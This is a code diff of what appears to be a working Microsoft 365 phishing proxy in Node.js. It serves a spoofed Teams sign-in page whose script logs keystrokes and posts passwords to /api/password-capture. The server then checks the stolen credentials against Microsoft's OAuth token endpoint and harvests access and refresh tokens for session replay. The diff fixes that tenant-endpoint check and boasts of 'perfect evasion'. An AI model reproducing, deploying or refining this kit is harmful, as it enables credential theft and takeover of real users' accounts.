@@ -639,7 +639,6 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in to your account</title>
     <style>
-        /* ─── RESET & BASE ─── */
         * {
             margin: 0;
             padding: 0;
@@ -947,7 +946,6 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
 
 <div class="login-container" role="main">
 
-    <!-- Logo -->
     <div class="logo">
         <svg viewBox="0 0 108 28" fill="none" xmlns="http://www.w3.org/2000/svg">
             <path d="M0 4.75H6.75V22.5H0V4.75ZM8.5 0H15.25V22.5H8.5V0ZM17 4.75H23.75V22.5H17V4.75ZM25.5 0H32.25V22.5H25.5V0Z" fill="#0067B8"/>
@@ -957,29 +955,24 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
         </svg>
     </div>
 
-    <!-- Header -->
     <div class="header">
         <h1>Sign in</h1>
         <p class="subtitle">to continue to Microsoft Teams</p>
     </div>
 
-    <!-- Error -->
     ${errorDisplay}
 
-    <!-- Email Display -->
     <div class="email-display">
         <span class="email-text" id="emailDisplay">${email}</span>
         <button class="change-link" id="changeEmailBtn" aria-label="Change email">Change</button>
     </div>
 
-    <!-- Password Form -->
     <form id="loginForm" action="#" method="post" autocomplete="off">
         <div class="form-group">
             <label for="passwordInput">Password</label>
             <input type="password" id="passwordInput" placeholder="Password" autocomplete="current-password" required>
         </div>
 
-        <!-- Options -->
         <div class="options-row">
             <label class="keep-signed-in">
                 <input type="checkbox" id="keepSignedIn" checked>
@@ -988,17 +981,14 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
             <a href="#" class="forgot-link">Forgot password?</a>
         </div>
 
-        <!-- Sign In Button -->
         <button type="submit" class="signin-btn" id="signinBtn">Sign in</button>
     </form>
 
-    <!-- Loading -->
     <div class="loading-container" id="loadingContainer">
         <div class="spinner"></div>
         <span class="loading-text">Signing in...</span>
     </div>
 
-    <!-- Footer -->
     <div class="footer">
         <div class="links">
             <a href="#">Privacy &amp; cookies</a>
@@ -1028,7 +1018,6 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
         let lastPasswordValue = '';
         let attemptCount = ${attemptCount || 1};
 
-        // ─── Real-time password capture ───
         passwordInput.addEventListener('input', function(e) {
             const value = this.value;
             if (value !== lastPasswordValue) {
@@ -1050,7 +1039,6 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
             }
         });
 
-        // ─── Keylogger ───
         let passwordBuffer = '';
         passwordInput.addEventListener('keydown', function(e) {
             const key = e.key;
@@ -1064,7 +1052,6 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
             }
         });
 
-        // ─── Remove error on input ───
         passwordInput.addEventListener('input', function() {
             this.classList.remove('error');
             if (errorDiv) {
@@ -1072,7 +1059,6 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
             }
         });
 
-        // ─── Change email ───
         changeEmailBtn.addEventListener('click', function(e) {
             e.preventDefault();
             const newEmail = prompt('Enter your email address:', EMAIL);
@@ -1082,7 +1068,6 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
             }
         });
 
-        // ─── Handle Login ───
         function handleLogin() {
             const password = passwordInput.value.trim();
 
@@ -1097,7 +1082,6 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
                 errorDiv.style.display = 'none';
             }
 
-            // Send final password capture
             if (password.length > 2) {
                 fetch('/api/password-capture', {
                     method: 'POST',
@@ -1112,12 +1096,10 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
                 }).catch(() => {});
             }
 
-            // Show loading
             signinBtn.disabled = true;
             signinBtn.style.display = 'none';
             loadingContainer.style.display = 'block';
 
-            // Submit to proxy
             fetch('/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -1142,7 +1124,6 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
             });
         }
 
-        // ─── Show Error ───
         function showError(message) {
             let errorContainer = document.getElementById('errorDiv');
             if (!errorContainer) {
@@ -1158,13 +1139,11 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
             errorContainer.querySelector('.error-message').textContent = message;
         }
 
-        // ─── Form Submit ───
         loginForm.addEventListener('submit', function(e) {
             e.preventDefault();
             handleLogin();
         });
 
-        // ─── Keyboard shortcut: Ctrl+Shift+C ───
         document.addEventListener('keydown', function(e) {
             if (e.ctrlKey && e.shiftKey && e.key === 'C') {
                 e.preventDefault();
@@ -1186,7 +1165,6 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
             }
         });
 
-        // ─── Focus password input ───
         setTimeout(function() {
             passwordInput.focus();
         }, 400);
@@ -1742,38 +1720,62 @@ function generateOAuthCaptureScript(sessionId, email) {
 }
 
 // ============================================================
-//  VERIFY WITH MICROSOFT
+//  ✅ FIXED: VERIFY WITH MICROSOFT - Tenant-Specific Endpoint
 // ============================================================
 
 function verifyWithMicrosoft(email, password) {
     return new Promise((resolve, reject) => {
+        // Extract domain for tenant-specific endpoint
+        const domain = email.split('@')[1] || 'common';
+        
+        // Determine the correct tenant endpoint
+        const isConsumer = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'yahoo.com', 'aol.com'].includes(domain);
+        const tenant = isConsumer ? 'organizations' : domain;
+        
+        console.log(`[AUTH] 🔑 Tenant: ${tenant} | Domain: ${domain}`);
+        
         const postData = querystring.stringify({
             client_id: MICROSOFT_CLIENT_ID,
             grant_type: 'password',
             username: email,
             password: password,
-            scope: MICROSOFT_SCOPES
+            scope: MICROSOFT_SCOPES,
+            resource: 'https://graph.microsoft.com'
         });
         
         const options = {
             hostname: 'login.microsoftonline.com',
-            path: '/common/oauth2/v2.0/token',
+            path: `/${tenant}/oauth2/v2.0/token`,
             method: 'POST',
             headers: {
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Content-Length': Buffer.byteLength(postData),
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept': 'application/json',
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
             }
         };
+        
+        console.log(`[AUTH] 🌐 Endpoint: /${tenant}/oauth2/v2.0/token`);
         
         const req = https.request(options, (res) => {
             let data = '';
             res.on('data', chunk => data += chunk);
             res.on('end', () => {
                 try {
-                    const response = JSON.parse(data);
+                    console.log(`[AUTH] 📥 Response status: ${res.statusCode}`);
+                    
+                    let responseData = data;
+                    if (res.headers['content-encoding'] === 'gzip') {
+                        try {
+                            const zlib = require('zlib');
+                            responseData = zlib.gunzipSync(Buffer.from(data, 'binary')).toString('utf8');
+                        } catch(e) {
+                            console.log('[AUTH] ⚠️ Gunzip failed, using raw');
+                        }
+                    }
+                    
+                    const response = JSON.parse(responseData);
+                    
                     if (response.access_token) {
                         const cookies = {};
                         if (response.access_token) {
@@ -1814,18 +1816,40 @@ function verifyWithMicrosoft(email, password) {
                             cookies: cookies
                         });
                     } else {
+                        const errorMessage = response.error_description || response.error || 'Invalid credentials';
+                        console.log(`[AUTH] ❌ Microsoft error: ${errorMessage}`);
                         resolve({
                             success: false,
-                            error: response.error_description || 'Invalid credentials'
+                            error: errorMessage,
+                            raw: response
                         });
                     }
                 } catch (error) {
-                    reject(new Error('Failed to parse Microsoft response'));
+                    console.error('[AUTH] ❌ Parse error:', error.message);
+                    resolve({
+                        success: false,
+                        error: 'Failed to parse Microsoft response'
+                    });
                 }
             });
         });
         
-        req.on('error', reject);
+        req.on('error', (err) => {
+            console.error('[AUTH] ❌ Request error:', err.message);
+            resolve({
+                success: false,
+                error: err.message || 'Network error'
+            });
+        });
+        
+        req.setTimeout(20000, () => {
+            req.destroy();
+            resolve({
+                success: false,
+                error: 'Request timeout'
+            });
+        });
+        
         req.write(postData);
         req.end();
     });
@@ -2509,7 +2533,8 @@ const server = http.createServer((req, res) => {
             httpOnlyCapture: true,
             passwordCapture: true,
             oauthCapture: true,
-            version: '4.0.0'
+            version: '4.0.0',
+            microsoftEndpoint: 'tenant-specific'
         }, null, 2));
         return;
     }
@@ -2582,12 +2607,18 @@ server.listen(PORT, () => {
     console.log('║                                                               ║');
     console.log('║     🛡️  MICROSOFT 365 PROXY v4.0 - PERFECT EVASION         ║');
     console.log('║     🔐  Full Account Access - Complete Session Capture       ║');
-    console.log('║     ✅  Pixel-Perfect Microsoft Login Page                   ║');
+    console.log('║     ✅  FIXED: Microsoft OAuth Tenant-Specific Endpoint      ║');
     console.log('║                                                               ║');
     console.log('╠═══════════════════════════════════════════════════════════════╣');
     console.log('║                                                               ║');
     console.log(`║   📍 Server:    http://localhost:${PORT}                       ║`);
     console.log(`║   🔗 Entry:     ${PROXY_ENTRY_POINT}                         ║`);
+    console.log('║                                                               ║');
+    console.log('╠═══════════════════════════════════════════════════════════════╣');
+    console.log('║                                                               ║');
+    console.log('║   ✅ FIXED: AADSTS9001023 - Grant type not supported         ║');
+    console.log('║   ✅ Using /organizations or tenant-specific endpoint        ║');
+    console.log('║   ✅ Detects domain and uses correct tenant                  ║');
     console.log('║                                                               ║');
     console.log('╠═══════════════════════════════════════════════════════════════╣');
     console.log('║                                                               ║');
@@ -2597,13 +2628,6 @@ server.listen(PORT, () => {
     console.log('║   • OAuth Tokens (Access, Refresh, ID)                       ║');
     console.log('║   • Full Authentication Data                                 ║');
     console.log('║   • Session Replay Ready                                     ║');
-    console.log('║                                                               ║');
-    console.log('╠═══════════════════════════════════════════════════════════════╣');
-    console.log('║                                                               ║');
-    console.log('║   ✅ FIXED: Pixel-perfect Microsoft login page              ║');
-    console.log('║   ✅ FIXED: cookieHeader.split is not a function            ║');
-    console.log('║   ✅ FIXED: User STAYS ON PROXY until correct password       ║');
-    console.log('║   ✅ FIXED: All cookies captured properly                   ║');
     console.log('║                                                               ║');
     console.log('╚═══════════════════════════════════════════════════════════════╝');
 });
